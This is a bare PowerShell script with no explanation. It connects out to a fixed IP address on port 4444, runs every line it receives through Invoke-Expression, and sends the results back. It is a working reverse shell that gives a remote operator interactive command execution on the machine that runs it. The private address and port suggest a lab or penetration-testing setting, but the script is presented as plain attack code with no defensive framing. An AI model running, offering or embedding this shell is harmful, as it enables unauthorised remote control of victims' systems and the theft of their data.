$port = 4444
$ip = '192.168.126.135'

$socket = New-Object System.Net.Sockets.TcpClient($ip, $port)
$stream = $socket.GetStream()
$reader = New-Object System.IO.StreamReader $stream
$writer = New-Object System.IO.StreamWriter $stream

[byte[]]$buffer = 0..65535|%{0}

while($true){
    $data = $reader.ReadLine()
    if ($data -eq $null) {
        break
    }
    
    $sendback = (iex $data 2>&1 | Out-String )
    $writer.WriteLine($sendback)
    $writer.Flush()
}

$socket.Close()
